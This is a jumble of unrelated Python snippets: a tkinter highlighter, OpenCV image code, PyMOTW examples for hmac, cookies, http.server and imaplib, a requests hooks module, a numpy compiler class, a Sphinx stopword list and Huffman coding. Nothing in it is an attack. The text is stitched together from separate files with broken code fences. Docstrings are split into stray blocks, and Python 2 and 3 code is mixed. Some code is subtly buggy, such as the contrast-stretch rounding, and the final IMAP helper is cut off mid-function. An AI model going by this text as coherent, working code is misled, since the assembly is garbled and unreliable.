c.Exporter.preprocessors = [pp_mod_name + ".HighlighterPreprocessor"]
c.NbConvertApp.postprocessor_class = pp_mod_name + ".HighlighterPostProcessor"
# latex
c.Exporter.template_file = "highlighter.tplx"
# html
# c.Exporter.template_file = 'highlighter.tpl'

# Highlight Selected Part of Text

import tkinter
from tkinter import *
import tkinter as tk
import tkinter.messagebox as mbox


window = Tk()
window.geometry("1000x700")
window.title("Highlight Selected Part of Text")


class highlight_fun(tk.Frame):
    def __init__(self, parent, *args, **kwargs):

        hightlightb = Button(
            window,
            text="HIGHLIGHT",
            command=self.highlight_text,
            font=("Arial", 20),
            bg="light green",
            fg="blue",
            borderwidth=3,
            relief="raised",
        )
        hightlightb.place(x=100, y=610)

        unhightlightb = Button(
            window,
            text="UN HIGHLIGHT",
            command=self.unhightlight_text,
            font=("Arial", 20),
            bg="light green",
            fg="blue",
            borderwidth=3,
            relief="raised",
        )
        unhightlightb.place(x=320, y=610)

        clearb = Button(
            window,
            text="CLEAR",
            command=self.clear_text,
            font=("Arial", 20),
            bg="light green",
            fg="blue",
            borderwidth=3,
            relief="raised",
        )
        clearb.place(x=600, y=610)

        tk.Frame.__init__(self, parent, *args, **kwargs)

        self.text = tk.Text(
            self,
            height=17,
            width=70,
            font=("Arial", 15),
            bg="light yellow",
            fg="brown",
            borderwidth=3,
            relief="solid",
        )
        self.text.pack(fill="both", expand=True)

        self.text.tag_configure("start", background="green", foreground="red")

    def highlight_text(self):
        try:
            self.text.tag_add("start", "sel.first", "sel.last")
        except tk.TclError:
            pass

    def unhightlight_text(self):
        self.text.tag_remove("start", "1.0", "end")

    def clear_text(self):
        self.text.delete("1.0", END)


# top label
start1 = tk.Label(
    text="HIGHLIGHT SELECTED TEXT", font=("Arial", 50), fg="magenta", underline=0
)  # same way bg
start1.place(x=50, y=10)

note1 = tk.Label(
    text="Enter Any Paragraph in Text Area, select any text and click on HIGHLIGHT Button.\nAnd to un-highlight the highlighted text, click on UN HIGHLIGHT button.\nTo clear the entered text, click on CLEAR button.",
    font=("Arial", 18),
    fg="brown",
)  # same way bg
note1.place(x=50, y=510)

# highlight_text(window).pack(expand=1, fill="both")
highlight_fun(window).place(x=100, y=100)


def exit_win():
    if mbox.askokcancel("Exit", "Do you want to exit?"):
        window.destroy()


exitb = Button(
    window,
    text="EXIT",
    command=exit_win,
    font=("Arial", 20),
    bg="red",
    fg="blue",
    borderwidth=3,
    relief="raised",
)
exitb.place(x=780, y=610)


window.protocol("WM_DELETE_WINDOW", exit_win)
window.mainloop()
````

````py

@author: Binish125```


```py
import copy
import os

import cv2
import numpy as np
from matplotlib import pyplot as plt


class contrastStretch:
    def __init__(self):
        self.img = ""
        self.original_image = ""
        self.last_list = []
        self.rem = 0
        self.L = 256
        self.sk = 0
        self.k = 0
        self.number_of_rows = 0
        self.number_of_cols = 0

    def stretch(self, input_image):
        self.img = cv2.imread(input_image, 0)
        self.original_image = copy.deepcopy(self.img)
        x, _, _ = plt.hist(self.img.ravel(), 256, [0, 256], label="x")
        self.k = np.sum(x)
        for i in range(len(x)):
            prk = x[i] / self.k
            self.sk += prk
            last = (self.L - 1) * self.sk
            if self.rem != 0:
                self.rem = int(last % last)
            last = int(last + 1 if self.rem >= 0.5 else last)
            self.last_list.append(last)
            self.number_of_rows = int(np.ma.count(self.img) / self.img[1].size)
            self.number_of_cols = self.img[1].size
        for i in range(self.number_of_cols):
            for j in range(self.number_of_rows):
                num = self.img[j][i]
                if num != self.last_list[num]:
                    self.img[j][i] = self.last_list[num]
        cv2.imwrite("output_data/output.jpg", self.img)

    def plotHistogram(self):
        plt.hist(self.img.ravel(), 256, [0, 256])

    def showImage(self):
        cv2.imshow("Output-Image", self.img)
        cv2.imshow("Input-Image", self.original_image)
        cv2.waitKey(5000)
        cv2.destroyAllWindows()


if __name__ == "__main__":
    file_path = os.path.join(os.path.basename(__file__), "image_data/input.jpg")
    stretcher = contrastStretch()
    stretcher.stretch(file_path)
    stretcher.plotHistogram()
    stretcher.showImage()

#!/usr/bin/env python3```


```pyGenerate a base64 encoded HMAC signature.```


```py

# end_pymotw_header
import base64
import hmac
import hashlib

with open("lorem.txt", "rb") as f:
    body = f.read()

hash = hmac.new(b"secret-shared-key-goes-here", body, hashlib.sha1)

digest = hash.digest()
print(base64.encodebytes(digest))

#!/usr/bin/env python3```


```pyCheck the digests of pickles passed through a stream.```


```py

# end_pymotw_header
import hashlib
import hmac
import io
import pickle
import pprint


def make_digest(message):
    "Return a digest for the message."
    hash = hmac.new(b"secret-shared-key-goes-here", message, hashlib.sha1)
    return hash.hexdigest().encode("utf-8")


class SimpleObject:
    """Demonstrate checking digests before unpickling.
    """

    def __init__(self, name):
        self.name = name

    def __str__(self):
        return self.name


# Simulate a writable socket or pipe with a buffer
out_s = io.BytesIO()

# Write a valid object to the stream:
#  digest\nlength\npickle
o = SimpleObject("digest matches")
pickled_data = pickle.dumps(o)
digest = make_digest(pickled_data)
header = b"%s %d\n" % (digest, len(pickled_data))
print("WRITING: {}".format(header))
out_s.write(header)
out_s.write(pickled_data)

# Write an invalid object to the stream
o = SimpleObject("digest does not match")
pickled_data = pickle.dumps(o)
digest = make_digest(b"not the pickled data at all")
header = b"%s %d\n" % (digest, len(pickled_data))
print("\nWRITING: {}".format(header))
out_s.write(header)
out_s.write(pickled_data)

out_s.flush()


# Simulate a readable socket or pipe with a buffer
in_s = io.BytesIO(out_s.getvalue())

# Read the data
while True:
    first_line = in_s.readline()
    if not first_line:
        break
    incoming_digest, incoming_length = first_line.split(b" ")
    incoming_length = int(incoming_length.decode("utf-8"))
    print("\nREAD:", incoming_digest, incoming_length)

    incoming_pickled_data = in_s.read(incoming_length)

    actual_digest = make_digest(incoming_pickled_data)
    print("ACTUAL:", actual_digest)

    if hmac.compare_digest(actual_digest, incoming_digest):
        obj = pickle.loads(incoming_pickled_data)
        print("OK:", obj)
    else:
        print("WARNING: Data corruption")

#!/usr/bin/env python3```


```pyGenerate an HMAC signature using SHA1.```


```py

# end_pymotw_header
import hmac
import hashlib

digest_maker = hmac.new(b"secret-shared-key-goes-here", b"", hashlib.sha1)

with open("hmac_sha.py", "rb") as f:
    while True:
        block = f.read(1024)
        if not block:
            break
        digest_maker.update(block)

digest = digest_maker.hexdigest()
print(digest)

#!/usr/bin/env python3```


```pyGenerate a simple HMAC signature.```


```py

# end_pymotw_header
import hmac

digest_maker = hmac.new(b"secret-shared-key-goes-here")

with open("lorem.txt", "rb") as f:
    while True:
        block = f.read(1024)
        if not block:
            break
        digest_maker.update(block)

digest = digest_maker.hexdigest()
print(digest)

# -*- coding: utf-8 -*-
````

````py
requests.hooks
~~~~~~~~~~~~~~

This module provides the capabilities for the Requests hooks system.

Available hooks:

``response``:
    The response generated from a Request.```


```py
HOOKS = ["response"]


def default_hooks():
    return {event: [] for event in HOOKS}


# TODO: response is the only one


def dispatch_hook(key, hooks, hook_data, **kwargs):
    """Dispatches a hook dictionary on a given piece of data."""
    hooks = hooks or {}
    hooks = hooks.get(key)
    if hooks:
        if hasattr(hooks, "__call__"):
            hooks = [hooks]
        for hook in hooks:
            _hook_data = hook(hook_data, **kwargs)
            if _hook_data is not None:
                hook_data = _hook_data
    return hook_data

#!/usr/bin/python
import sys

from colorprint import colorize


added_to_path = False
if '/etc' not in sys.path:
    sys.path.insert(0, '/etc')
    added_to_path = True

try:
    import commanderconfig
except ImportError:
    print "Couldn't import config. Please create /etc/commanderconfig.py"
    sys.exit(1)

if added_to_path:
    del sys.path[0]


def get_systems(host_group):
    return commanderconfig.hostgroups[host_group]


def list_groups(color=True):
    groups = sorted(commanderconfig.hostgroups.keys())
    for g in groups:
        group = g
        if color:
            g = colorize(g, 'green')
        print "%s: %s" % (g, ",".join(get_systems(group)))

#!/bin/python3

import math
import os
import random
import re
import sys


#
# Complete the 'howMany' function below.
#
# The function is expected to return an INTEGER.
# The function accepts STRING sentence as parameter.
#
import re


def howMany(sentence):
    # Write your code here
    # invalid = ['?', '.', '[', ']', '{', '}', '(', ')', ',', '!']
    l = sentence.split()
    n = 0
    for i in range(len(l)):
        t = 0
        if l[i].isnumeric():
            continue
        for j in range(0, len(l[i]) - 1):
            if l[i][j].isalpha() != True and l[i][j] != "-":
                t = 1
                break
        if t == 0:
            n += 1
    return n

# pip install pyttsx3
import pyttsx3

# pip install SpeechRecognition
import speech_recognition as sr

# pip install pywikihow
from pywikihow import search_wikihow

# creating object
engine = pyttsx3.init()

# function for speaking up the results through speakers
def fun_talk(audio):
    engine.say(audio)
    engine.runAndWait()


# function for taking the voice commands and recognizing it
def get_command():

    rec = sr.Recognizer()
    with sr.Microphone() as source:
        print("Say something...")
        rec.pause_threshold = 1

        audio = rec.listen(source)

        try:
            print("Recognizing...")
            query = rec.recognize_google(audio, language="en-in")
            print(f"You said: {query}\n")

        except Exception as e:
            # print(e)
            print("Say that again please...")
            return "None"

        return query


if __name__ == "__main__":

    # while True:
    if 1:

        # taking the voice command  from the user
        query = get_command().lower()

        # checking if it contains the phrase 'how to'
        if "how to" in query:
            try:
                max_results = 1
                data = search_wikihow(query, max_results)
                data[0].print()
                fun_talk(data[0].summary)

            except Exception as e:
                fun_talk("Sorry, I am unable to find the answer for your query.")

from selenium import webdriver

driver = webdriver.Chrome("C:\webdrivers\chromedriver.exe")

driver.get("https://www.nirfindia.org/2020/UniversityRanking.html")
driver.maximize_window()

institute_id = driver.find_elements_by_xpath(
    '//table[@id="tbl_overall"]/tbody/tr/td[1]'
)
name = driver.find_elements_by_xpath('//table[@id="tbl_overall"]/tbody/tr/td[2]')
city = driver.find_elements_by_xpath('//table[@id="tbl_overall"]/tbody/tr/td[3]')
state = driver.find_elements_by_xpath('//table[@id="tbl_overall"]/tbody/tr/td[4]')
score = driver.find_elements_by_xpath('//table[@id="tbl_overall"]/tbody/tr/td[5]')
rank = driver.find_elements_by_xpath('//table[@id="tbl_overall"]/tbody/tr/td[6]')

nirf_result = []
for i in range(len(city)):
    temporary_data = {
        "Institute Id": institute_id[i].text,
        "Name": name[i].text,
        "City": city[i].text,
        "State": state[i].text,
        "Score": score[i].text,
        "Rank": rank[i].text,
    }
    nirf_result.append(temporary_data)

import pandas as pd

df_data = pd.DataFrame(nirf_result)
print(df_data)
df_data.to_excel("nirf_ranking_result.xlsx", index=False)
df_data.to_csv("nirf_ranking_result.csv", index=False)

from numpy.distutils.fcompiler import FCompiler

compilers = ["HPUXFCompiler"]


class HPUXFCompiler(FCompiler):

    compiler_type = "hpux"
    description = "HP Fortran 90 Compiler"
    version_pattern = r"HP F90 (?P<version>[^\s*,]*)"

    executables = {
        "version_cmd": ["f90", "+version"],
        "compiler_f77": ["f90"],
        "compiler_fix": ["f90"],
        "compiler_f90": ["f90"],
        "linker_so": ["ld", "-b"],
        "archiver": ["ar", "-cr"],
        "ranlib": ["ranlib"],
    }
    module_dir_switch = None  # XXX: fix me
    module_include_switch = None  # XXX: fix me
    pic_flags = ["+Z"]

    def get_flags(self):
        return self.pic_flags + ["+ppu", "+DD64"]

    def get_flags_opt(self):
        return ["-O3"]

    def get_libraries(self):
        return ["m"]

    def get_library_dirs(self):
        opt = ["/usr/lib/hpux64"]
        return opt

    def get_version(self, force=0, ok_status=[256, 0, 1]):
        # XXX status==256 may indicate 'unrecognized option' or
        #     'no input file'. So, version_cmd needs more work.
        return FCompiler.get_version(self, force, ok_status)


if __name__ == "__main__":
    from distutils import log

    log.set_verbosity(10)
    from numpy.distutils import customized_fcompiler

    print(customized_fcompiler(compiler="hpux").get_version())

# Tested in python2.7
# Getting Html text and saving it to a file.
import urllib


def get_html(url, fname):
    try:
        responsive = urllib.urlopen(url)
        save_file = open(fname + ".html", "w")
        save_file.write(responsive.read())
        save_file.close()
    except IOError:
        return "Make sure url entered is correct and valid!"
    except Exception as e:
        return "An Error occured, make sure information enerted is correct!"
    else:
        return "Html Successfully received and saved in file {}.html".format(fname)
    # if you want to read the file uncomment this code
    # emp = open(name + ".html", 'r').read()
    # openFile.close()
    # return emp


print("Hello,")
while True:
    start_or_end = str(raw_input("start or end: ")).strip().lower()
    if start_or_end == "start":
        print(
            get_html(raw_input("URL: ").strip(), raw_input("file name: ").strip()), "\n"
        )
        continue
    quit()

import socket
import typing

from tornado.http1connection import HTTP1Connection
from tornado.httputil import HTTPMessageDelegate
from tornado.iostream import IOStream
from tornado.locks import Event
from tornado.netutil import add_accept_handler
from tornado.testing import AsyncTestCase, bind_unused_port, gen_test


class HTTP1ConnectionTest(AsyncTestCase):
    code = None  # type: typing.Optional[int]

    def setUp(self):
        super().setUp()
        self.asyncSetUp()

    @gen_test
    def asyncSetUp(self):
        listener, port = bind_unused_port()
        event = Event()

        def accept_callback(conn, addr):
            self.server_stream = IOStream(conn)
            self.addCleanup(self.server_stream.close)
            event.set()

        add_accept_handler(listener, accept_callback)
        self.client_stream = IOStream(socket.socket())
        self.addCleanup(self.client_stream.close)
        yield [self.client_stream.connect(("127.0.0.1", port)), event.wait()]
        self.io_loop.remove_handler(listener)
        listener.close()

    @gen_test
    def test_http10_no_content_length(self):
        # Regression test for a bug in which can_keep_alive would crash
        # for an HTTP/1.0 (not 1.1) response with no content-length.
        conn = HTTP1Connection(self.client_stream, True)
        self.server_stream.write(b"HTTP/1.0 200 Not Modified\r\n\r\nhello")
        self.server_stream.close()

        event = Event()
        test = self
        body = []

        class Delegate(HTTPMessageDelegate):
            def headers_received(self, start_line, headers):
                test.code = start_line.code

            def data_received(self, data):
                body.append(data)

            def finish(self):
                event.set()

        yield conn.read_response(Delegate())
        yield event.wait()
        self.assertEqual(self.code, 200)
        self.assertEqual(b"".join(body), b"hello")

```









---


```py



# end_pymotw_header
from http import cookies
import datetime


def show_cookie(c):
    print(c)
    for key, morsel in c.items():
        print()
        print("key =", morsel.key)
        print("  value =", morsel.value)
        print("  coded_value =", morsel.coded_value)
        for name in morsel.keys():
            if morsel[name]:
                print("  {} = {}".format(name, morsel[name]))


c = cookies.SimpleCookie()

# A cookie with a value that has to be encoded
# to fit into the header
c["encoded_value_cookie"] = '"cookie,value;"'
c["encoded_value_cookie"]["comment"] = "Has escaped punctuation"

# A cookie that only applies to part of a site
c["restricted_cookie"] = "cookie_value"
c["restricted_cookie"]["path"] = "/sub/path"
c["restricted_cookie"]["domain"] = "PyMOTW"
c["restricted_cookie"]["secure"] = True

# A cookie that expires in 5 minutes
c["with_max_age"] = "expires in 5 minutes"
c["with_max_age"]["max-age"] = 300  # seconds

# A cookie that expires at a specific time
c["expires_at_time"] = "cookie_value"
time_to_live = datetime.timedelta(hours=1)
expires = datetime.datetime(2009, 2, 14, 18, 30, 14) + time_to_live

# Date format: Wdy, DD-Mon-YY HH:MM:SS GMT
expires_at_time = expires.strftime("%a, %d %b %Y %H:%M:%S")
c["expires_at_time"]["expires"] = expires_at_time

show_cookie(c)

```









---


```py



# end_pymotw_header
from http import cookies


c = cookies.SimpleCookie()
c["integer"] = 5
c["with_quotes"] = 'He said, "Hello, World!"'

for name in ["integer", "with_quotes"]:
    print(c[name].key)
    print("  {}".format(c[name]))
    print("  value={!r}".format(c[name].value))
    print("  coded_value={!r}".format(c[name].coded_value))
    print()

```









---


```py



# end_pymotw_header
from http import cookies
import textwrap


c = cookies.SimpleCookie()
c["mycookie"] = "cookie_value"
c["another_cookie"] = "second value"
js_text = c.js_output()
print(textwrap.dedent(js_text).lstrip())

```









---


```py



# end_pymotw_header
from http import cookies


HTTP_COOKIE = "; ".join([r"integer=5", r'with_quotes="He said, \"Hello, World!\""'])

print("From constructor:")
c = cookies.SimpleCookie(HTTP_COOKIE)
print(c)

print()
print("From load():")
c = cookies.SimpleCookie()
c.load(HTTP_COOKIE)
print(c)

```









---


```py



# end_pymotw_header
from http import cookies


c = cookies.SimpleCookie()
c["mycookie"] = "cookie_value"
print(c)

#!/usr/bin/env python3```


```pySimple GET handler with BaseHTTPServer```


```py

# end_pymotw_header
from http.server import BaseHTTPRequestHandler
from urllib import parse


class GetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = parse.urlparse(self.path)
        message_parts = [
            "CLIENT VALUES:",
            "client_address={} ({})".format(self.client_address, self.address_string()),
            "command={}".format(self.command),
            "path={}".format(self.path),
            "real path={}".format(parsed_path.path),
            "query={}".format(parsed_path.query),
            "request_version={}".format(self.request_version),
            "",
            "SERVER VALUES:",
            "server_version={}".format(self.server_version),
            "sys_version={}".format(self.sys_version),
            "protocol_version={}".format(self.protocol_version),
            "",
            "HEADERS RECEIVED:",
        ]
        for name, value in sorted(self.headers.items()):
            message_parts.append("{}={}".format(name, value.rstrip()))
        message_parts.append("")
        message = "\r\n".join(message_parts)
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        self.wfile.write(message.encode("utf-8"))


if __name__ == "__main__":
    from http.server import HTTPServer

    server = HTTPServer(("localhost", 8080), GetHandler)
    print("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

#!/usr/bin/env python3```


```pySimple POST handler with BaseHTTPServer```


```py

# end_pymotw_header
import cgi
from http.server import BaseHTTPRequestHandler
import io


class PostHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Parse the form data posted
        form = cgi.FieldStorage(
            fp=self.rfile,
            headers=self.headers,
            environ={
                "REQUEST_METHOD": "POST",
                "CONTENT_TYPE": self.headers["Content-Type"],
            },
        )

        # Begin the response
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()

        out = io.TextIOWrapper(
            self.wfile, encoding="utf-8", line_buffering=False, write_through=True
        )

        out.write("Client: {}\n".format(self.client_address))
        out.write("User-agent: {}\n".format(self.headers["user-agent"]))
        out.write("Path: {}\n".format(self.path))
        out.write("Form data:\n")

        # Echo back information about what was posted in the form
        for field in form.keys():
            field_item = form[field]
            if field_item.filename:
                # The field contains an uploaded file
                file_data = field_item.file.read()
                file_len = len(file_data)
                del file_data
                out.write(
                    "\tUploaded {} as {!r} ({} bytes)\n".format(
                        field, field_item.filename, file_len
                    )
                )
            else:
                # Regular form value
                out.write("\t{}={}\n".format(field, form[field].value))

        # Disconnect our encoding wrapper from the underlying
        # buffer so that deleting the wrapper doesn't close
        # the socket, which is still being used by the server.
        out.detach()


if __name__ == "__main__":
    from http.server import HTTPServer

    server = HTTPServer(("localhost", 8080), PostHandler)
    print("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

#!/usr/bin/env python3```


```pyGET handler with BaseHTTPServer illustrating error handling```


```py

# end_pymotw_header
from http.server import BaseHTTPRequestHandler


class ErrorHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_error(404)


if __name__ == "__main__":
    from http.server import HTTPServer

    server = HTTPServer(("localhost", 8080), ErrorHandler)
    print("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

#!/usr/bin/env python3
#
# Copyright 2007 Doug Hellmann.
#```


```pySimple GET handler with BaseHTTPServer```


```py


# end_pymotw_header
from http.server import BaseHTTPRequestHandler
import time


class GetHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Last-Modified", self.date_time_string(time.time()))
        self.end_headers()
        self.wfile.write("Response body\n".encode("utf-8"))


if __name__ == "__main__":
    from http.server import HTTPServer

    server = HTTPServer(("localhost", 8080), GetHandler)
    print("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()

#!/usr/bin/env python3```


```pyThreaded GET handler with BaseHTTPServer```


```py

# end_pymotw_header
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading


class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.end_headers()
        message = threading.currentThread().getName()
        self.wfile.write(message.encode("utf-8"))
        self.wfile.write(b"\n")


class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""


if __name__ == "__main__":
    server = ThreadedHTTPServer(("localhost", 8080), Handler)
    print("Starting server, use <Ctrl-C> to stop")
    server.serve_forever()
````

````py
    sphinx.search.hu
    ~~~~~~~~~~~~~~~~

    Hungarian search language: includes the JS Hungarian stemmer.

    :copyright: Copyright 2007-2021 by the Sphinx team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from typing import Dict

import snowballstemmer

from sphinx.search import SearchLanguage, parse_stop_word

hungarian_stopwords = parse_stop_word(
    """
| source: http://snowball.tartarus.org/algorithms/hungarian/stop.txt
| prepared by Anna Tordai
a
ahogy
ahol
aki
akik
akkor
alatt
által
általában
amely
amelyek
amelyekben
amelyeket
amelyet
amelynek
ami
amit
amolyan
amíg
amikor
át
abban
ahhoz
annak
arra
arról
az
azok
azon
azt
azzal
azért
aztán
azután
azonban
bár
be
belül
benne
cikk
cikkek
cikkeket
csak
de
e
eddig
egész
egy
egyes
egyetlen
egyéb
egyik
egyre
ekkor
el
elég
ellen
elő
először
előtt
első
én
éppen
ebben
ehhez
emilyen
ennek
erre
ez
ezt
ezek
ezen
ezzel
ezért
és
fel
felé
hanem
hiszen
hogy
hogyan
igen
így
illetve
ill.
ill
ilyen
ilyenkor
ison
ismét
itt
jó
jól
jobban
kell
kellett
keresztül
keressünk
ki
kívül
között
közül
legalább
lehet
lehetett
legyen
lenne
lenni
lesz
lett
maga
magát
majd
majd
már
más
másik
meg
még
mellett
mert
mely
melyek
mi
mit
míg
miért
milyen
mikor
minden
mindent
mindenki
mindig
mint
mintha
mivel
most
nagy
nagyobb
nagyon
ne
néha
nekem
neki
nem
néhány
nélkül
nincs
olyan
ott
össze
ő
ők
őket
pedig
persze
rá
s
saját
sem
semmi
sok
sokat
sokkal
számára
szemben
szerint
szinte
talán
tehát
teljes
tovább
továbbá
több
úgy
ugyanis
új
újabb
újra
után
utána
utolsó
vagy
vagyis
valaki
valami
valamint
való
vagyok
van
vannak
volt
voltam
voltak
voltunk
vissza
vele
viszont
volna```


```py
)


class SearchHungarian(SearchLanguage):
    lang = "hu"
    language_name = "Hungarian"
    js_stemmer_rawcode = "hungarian-stemmer.js"
    stopwords = hungarian_stopwords

    def init(self, options: Dict) -> None:
        self.stemmer = snowballstemmer.stemmer("hungarian")

    def stem(self, word: str) -> str:
        return self.stemmer.stemWord(word.lower())

import sys


class Letter:
    def __init__(self, letter, freq):
        self.letter = letter
        self.freq = freq
        self.bitstring = {}

    def __repr__(self):
        return f"{self.letter}:{self.freq}"


class TreeNode:
    def __init__(self, freq, left, right):
        self.freq = freq
        self.left = left
        self.right = right


def parse_file(file_path):
    """
    Read the file and build a dict of all letters and their
    frequencies, then convert the dict into a list of Letters.
    """
    chars = {}
    with open(file_path) as f:
        while True:
            c = f.read(1)
            if not c:
                break
            chars[c] = chars[c] + 1 if c in chars.keys() else 1
    return sorted([Letter(c, f) for c, f in chars.items()], key=lambda l: l.freq)


def build_tree(letters):
    """
    Run through the list of Letters and build the min heap
    for the Huffman Tree.
    """
    while len(letters) > 1:
        left = letters.pop(0)
        right = letters.pop(0)
        total_freq = left.freq + right.freq
        node = TreeNode(total_freq, left, right)
        letters.append(node)
        letters.sort(key=lambda l: l.freq)
    return letters[0]


def traverse_tree(root, bitstring):
    """
    Recursively traverse the Huffman Tree to set each
    Letter's bitstring dictionary, and return the list of Letters
    """
    if type(root) is Letter:
        root.bitstring[root.letter] = bitstring
        return [root]
    letters = []
    letters += traverse_tree(root.left, bitstring + "0")
    letters += traverse_tree(root.right, bitstring + "1")
    return letters


def huffman(file_path):
    """
    Parse the file, build the tree, then run through the file
    again, using the letters dictionary to find and print out the
    bitstring for each letter.
    """
    letters_list = parse_file(file_path)
    root = build_tree(letters_list)
    letters = {
        k: v for letter in traverse_tree(root, "") for k, v in letter.bitstring.items()
    }
    print(f"Huffman Coding  of {file_path}: ")
    with open(file_path) as f:
        while True:
            c = f.read(1)
            if not c:
                break
            print(letters[c], end=" ")
    print()


if __name__ == "__main__":
    # pass the file path to the huffman function
    huffman(sys.argv[1])

# from cs 101 course of udacity.com (problem set solved solution)

# Given a list of lists representing a n * n matrix as input,
# define a  procedure that returns True if the input is an identity matrix
# and False otherwise.

# An IDENTITY matrix is a square matrix in which all the elements
# on the principal/main diagonal are 1 and all the elements outside
# the principal diagonal are 0.
# (A square matrix is a matrix in which the number of rows
# is equal to the number of columns)

def is_identity_matrix(matrix):
    total_elems = 0
    last_pos = 0
    for row in matrix:
        total_elems += len(row)
        if row[last_pos] == 1 and row.count(0) == len(row) - 1:
            last_pos += 1
        else:
            return False
    if total_elems == len(matrix[0]) * len(matrix[0]):
        return True
    else:
        return False


# Test Cases:

matrix1 = [[1,0,0,0],
           [0,1,0,0],
           [0,0,1,0],
           [0,0,0,1]]
print is_identity_matrix(matrix1)
#>>>True

matrix2 = [[1,0,0],
           [0,1,0],
           [0,0,0]]

print is_identity_matrix(matrix2)
#>>>False

matrix3 = [[2,0,0],
           [0,2,0],
           [0,0,2]]

print is_identity_matrix(matrix3)
#>>>False

matrix4 = [[1,0,0,0],
           [0,1,1,0],
           [0,0,0,1]]

print is_identity_matrix(matrix4)
#>>>False

matrix5 = [[1,0,0,0,0,0,0,0,0]]

print is_identity_matrix(matrix5)
#>>>False

matrix6 = [[1,0,0,0],
           [0,1,0,1],
           [0,0,1,0],
           [0,0,0,1]]

print is_identity_matrix(matrix6)
#>>>False

matrix7 = [[1, -1, 1],
           [0, 1, 0],
           [0, 0, 1]]
print is_identity_matrix(matrix7)
#>>>False


````

````py
    pygments.styles.igor
    ~~~~~~~~~~~~~~~~~~~~

    Igor Pro default style.

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String


class IgorStyle(Style):
    """
    Pygments version of the official colors for Igor Pro procedures.
    """

    default_style = ""

    styles = {
        Comment: "italic #FF0000",
        Keyword: "#0000FF",
        Name.Function: "#C34E00",
        Name.Decorator: "#CC00A3",
        Name.Class: "#007575",
        String: "#009C00",
    }

import cv2


# fetching the image
img = cv2.imread("image.jpg")
# giving the color changes
gray = cv2.cvtColor(img, cv2.COLOR_BGRA2GRAY)
gray = cv2.medianBlur(gray, 9)
edges = cv2.adaptiveThreshold(
    gray, 255, cv2.ADAPTIVE_THRESH_MEAN_C, cv2.THRESH_BINARY, 13, 6
)
color = cv2.bilateralFilter(img, 9, 250, 250)
cartoon = cv2.bitwise_and(color, color, mask=edges)

# showing the output image
cv2.imshow("output cartoonified image", cartoon)
cv2.waitKey(0)
cv2.destroyAllWindows()

import random
import urllib.request

get = str(input("Enter url of image to download :  "))


def download_image(url):
    name = random.randrange(1, 1000)
    full_name = str(name) + ".jpg"
    urllib.request.urlretrieve(url, full_name)


print(download_image(get))

import PIL
from PIL import Image

mywidth = 3278  # width of the image to be obtained
myheight = 4917  # height of the image to be obtained

# opening the image
img = Image.open("cute_dog.jpg")
# resizing the image
img = img.resize((mywidth, myheight), PIL.Image.ANTIALIAS)
# saving the image
img.save("resize.jpg")

import tkinter as tk
from tkinter import filedialog
from tkinter import messagebox
from PIL import Image

root = tk.Tk()

canvas1 = tk.Canvas(root, width=300, height=250, bg="azure3", relief="raised")
canvas1.pack()

label1 = tk.Label(root, text="File Conversion Tool", bg="azure3")
label1.config(font=("helvetica", 20))
canvas1.create_window(150, 60, window=label1)


def getIMG():
    global im1

    import_file_path = filedialog.askopenfilename()
    im1 = Image.open(import_file_path)


browseButton_PNG = tk.Button(
    text="      Import PNG File     ",
    command=getIMG,
    bg="deeppink",
    fg="white",
    font=("helvetica", 12, "bold"),
)
canvas1.create_window(150, 130, window=browseButton_PNG)


def convertToJPG():
    global im1

    export_file_path = filedialog.asksaveasfilename(defaultextension=".jpg")
    im1.save(export_file_path)


saveAsButton_JPG = tk.Button(
    text="Convert IMG to JPG",
    command=convertToJPG,
    bg="deeppink",
    fg="white",
    font=("helvetica", 12, "bold"),
)
canvas1.create_window(150, 180, window=saveAsButton_JPG)

root.mainloop()

```









---


```py


# end_pymotw_header
import imaplib
import time
import email.message
import imaplib_connect

new_message = email.message.Message()
new_message.set_unixfrom("pymotw")
new_message["Subject"] = "subject goes here"
new_message["From"] = "pymotw@example.com"
new_message["To"] = "example@example.com"
new_message.set_payload("This is the body of the message.\n")

print(new_message)

with imaplib_connect.open_connection() as c:
    c.append(
        "INBOX",
        "",
        imaplib.Time2Internaldate(time.time()),
        str(new_message).encode("utf-8"),
    )

    # Show the headers for all messages in the mailbox
    c.select("INBOX")
    typ, [msg_ids] = c.search(None, "ALL")
    for num in msg_ids.split():
        typ, msg_data = c.fetch(num, "(BODY.PEEK[HEADER])")
        for response_part in msg_data:
            if isinstance(response_part, tuple):
                print("\n{}:".format(num))
                print(response_part[1])

```









---


```py


# end_pymotw_header
import imaplib
import imaplib_connect

with imaplib_connect.open_connection() as c:
    # Find the "SEEN" messages in INBOX
    c.select("INBOX")
    typ, [response] = c.search(None, "SEEN")
    if typ != "OK":
        raise RuntimeError(response)
    msg_ids = ",".join(response.decode("utf-8").split(" "))

    # Create a new mailbox, "Example.Today"
    typ, create_response = c.create("Example.Today")
    print("CREATED Example.Today:", create_response)

    # Copy the messages
    print("COPYING:", msg_ids)
    c.copy(msg_ids, "Example.Today")

    # Look at the results
    c.select("Example.Today")
    typ, [response] = c.search(None, "ALL")
    print("COPIED:", response)

```









---


```py


# end_pymotw_header
import imaplib
import configparser
import os


def open_connection(verbose=False):
    # Read the config file
    config = configparser.ConfigParser()
    config.read([os.path.expanduser("~/.pymotw")])

    # Connect to the server
    hostname = config.get("server", "hostname")
    if verbose:
        print("Connecting to", hostname)
    connection = imaplib.IMAP4_SSL(hostname)

    # Login to our account
    username = config.get("account", "username")
